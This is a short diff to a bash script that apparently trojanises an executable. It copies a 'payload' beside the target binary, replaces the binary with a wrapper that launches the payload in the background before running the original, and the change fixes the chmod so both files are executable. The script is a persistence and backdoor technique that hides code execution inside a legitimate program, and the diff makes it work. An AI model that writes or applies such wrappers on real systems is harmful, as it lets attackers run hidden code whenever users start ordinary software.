@@ -46,7 +46,6 @@ fi
 log "Inserting payload"
 cp "$payload" "${binary}_pl"
 log "Making payload executable"
-chmod +x "${binary}_pl"
 
 log "Creating master"
 echo > "$binary" <<EOF
@@ -55,5 +54,6 @@ binary="$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")"
 "${binary}_pl" &
 "${binary}_og"
 EOF
+chmod +x "${binary}_pl" "$binary"
 
 succ "Success!"
